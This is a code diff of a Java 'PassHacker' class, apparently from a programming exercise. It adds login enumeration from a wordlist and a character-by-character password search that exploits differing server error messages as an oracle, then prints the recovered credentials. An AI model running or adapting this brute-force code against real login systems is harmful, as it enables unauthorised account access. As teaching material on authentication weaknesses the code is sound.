@@ -1,23 +1,37 @@
 package hacker;
 
-import java.io.DataInputStream;
-import java.io.DataOutputStream;
+import com.google.gson.Gson;
+import model.AuthRequest;
+
 import java.io.IOException;
-import java.util.ArrayList;
-import java.util.LinkedList;
-import java.util.List;
-import java.util.Queue;
+import java.util.*;
 
 public class PassHacker {
-    private final DataInputStream input;
-    private final DataOutputStream output;
-    private static final char[] allChars = "abcdefghijklmnopqrstuvwxyz01234567890".toCharArray();
+    RequestManager requestManager;
+    private static final char[] allChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890".toCharArray();
     private final List<String> passList;
+    private final List<String> loginList;
 
-    public PassHacker(DataInputStream input, DataOutputStream output) {
-        this.input = input;
-        this.output = output;
+    public PassHacker(RequestManager requestManager) {
+        this.requestManager = requestManager;
         this.passList = FileManager.getPassList();
+        this.loginList = FileManager.getLoginList();
+    }
+
+    public void start() {
+        String login = findLogin();
+        System.out.println();
+        if (login == null) {
+            System.out.println("Failed to find login");
+            return;
+        }
+        String password = findPassword(login, "");
+        System.out.println();
+        if (password == null) {
+            System.out.println("Failed to find password");
+            return;
+        }
+        System.out.println("Credits found: " + new Gson().toJson(new AuthRequest(login, password)));
     }
 
     @Deprecated
@@ -36,6 +50,7 @@ public class PassHacker {
         }
     }
 
+    @Deprecated
     public void dictionaryBasedBruteForce() throws IOException {
         for (String pass : passList) {
             for (String combination : generateAllCombinations(pass)) {
@@ -45,9 +60,7 @@ public class PassHacker {
     }
 
     private boolean checkPass(String pass) throws IOException {
-        output.writeUTF(pass);
-        String msgIn = input.readUTF();
-        System.out.print("\033[2K\rChecking pass :" + pass + ". Result: " + msgIn);
+        String msgIn = requestManager.sendSimpleRequest(pass);
 
         if (msgIn.equals("Too many attempts")) throw new IOException("Server is closed!");
         return msgIn.equals("Connection success!");
@@ -69,6 +82,27 @@ public class PassHacker {
         }
 
         return result;
+    }
+
+    private String findLogin() {
+        for (String rootLogin : loginList) {
+            for (String login : generateAllCombinations(rootLogin)) {
+                String result = requestManager.sendRequest(login, "123");
+                System.out.print("\033[2K\rChecking login :" + login + ". Result: " + result);
+                if (Objects.equals(result, "Wrong password!")) return login;
+            }
+        }
+        return null;
+    }
+
+    private String findPassword(String login, String pass) {
+        for (char c : allChars) {
+            String result = requestManager.sendRequest(login, pass + c);
+            System.out.print("\033[2K\rChecking pass :" + (pass + c) + ". Result: " + result);
+            if (Objects.equals(result, "Exception happened during login")) return findPassword(login, pass + c);
+            if (Objects.equals(result, "Connection success!")) return pass + c;
+        }
+        return null;
     }
 }
 
